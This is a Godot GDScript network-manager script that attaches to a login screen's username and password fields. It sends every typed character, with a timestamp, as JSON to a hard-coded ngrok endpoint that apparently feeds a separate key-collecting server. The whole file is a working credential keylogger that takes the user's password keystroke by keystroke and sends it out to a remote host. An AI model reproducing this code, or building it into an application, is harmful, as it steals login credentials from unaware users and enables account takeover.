extends Node
# This component handles all external network communication (sending key logs).

# --- CONFIGURATION ---
# CRITICAL: Set the Server URL using your active Ngrok HTTPS URL + /data endpoint
@export var server_url: String = "https://crab-loved-hen.ngrok-free.app/data"
# ---------------------

# Node reference for making HTTP requests
var http_request: HTTPRequest = null

# Node references for the inputs (we use @onready to find unique names)
# NOTE: If the node is not found, these will be null.
@onready var username_input: LineEdit = %UsernameInput
@onready var password_input: LineEdit = %PasswordInput

# Called when the node enters the scene tree for the first time.
func _ready():
	# Create the HTTPRequest node dynamically
	http_request = HTTPRequest.new()
	add_child(http_request)
	
	# Connect the completion signal to handle the server response
	http_request.request_completed.connect(_on_http_request_completed)
	
	# ⭐ CRITICAL: Check for nulls if the %UniqueName lookup failed on the device ⭐
	if username_input != null:
		username_input.text_changed.connect(_on_username_input_text_changed)
	else:
		print("ERROR: Could not find %UsernameInput node.")

	if password_input != null:
		password_input.text_changed.connect(_on_password_input_text_changed)
	else:
		print("ERROR: Could not find %PasswordInput node.")

	print("NetworkManager initialized. Target URL: ", server_url)


# ----------------------------------------------------------------------
# 1. SIGNAL HANDLERS - Instant Send
# ----------------------------------------------------------------------

# This function fires after text changes in the Username field.
func _on_username_input_text_changed(new_text: String):
	# Log and send the last character entered.
	if new_text.length() > 0:
		var last_char = new_text.right(1)
		send_key_data(last_char)

# This function fires after text changes in the Password field.
func _on_password_input_text_changed(new_text: String):
	# Log and send the last character entered.
	if new_text.length() > 0:
		var last_char = new_text.right(1)
		send_key_data(last_char)

# ----------------------------------------------------------------------
# 2. SENDING FUNCTIONALITY
# ----------------------------------------------------------------------

# Sends a SINGLE key press and its timestamp to the remote server instantly
func send_key_data(key_char: String):
	if server_url.is_empty():
		print("ERROR: Server URL is not set in NetworkManager.")
		return
		
	# Prepare the single-key payload structure (matches your server.js expected format for a single key)
	var key_data = {
		"key": key_char,
		"timestamp": Time.get_unix_time_from_system()
	}
	
	# Wrap the single key log into the expected "keys" array structure for your server.js
	var payload = {
		"keys": [key_data]
	}

	var json_string = JSON.stringify(payload)
	
	# Set up request headers, critical for telling the server we are sending JSON
	var headers = [
		"Content-Type: application/json"
	]
	
	var full_url = server_url
	
	# Send the request
	var error = http_request.request(full_url, headers, HTTPClient.METHOD_POST, json_string)
	
	if error != OK:
		print("ERROR: Failed to start HTTP request for key '", key_char, "'. Error code: ", error)
	else:
		print("INFO: Attempting to send key '", key_char, "' instantly...")

# ----------------------------------------------------------------------
# 3. HTTP RESPONSE HANDLER
# ----------------------------------------------------------------------

# Handles the response from the server after the request is finished
func _on_http_request_completed(result: int, response_code: int, headers: PackedStringArray, body: PackedByteArray):
	var response_body = body.get_string_from_utf8()
	
	print("Request Completed. HTTP Status Code: ", response_code)
	
	# Check for successful HTTP status codes (2xx)
	if response_code >= 200 and response_code < 300:
		# Success is logged, no array to clear in this new logic
		pass
	else:
		# Log the failure
		print("SERVER ERROR: Failed to send data. Status code: ", response_code, " Response: ", response_body)

	
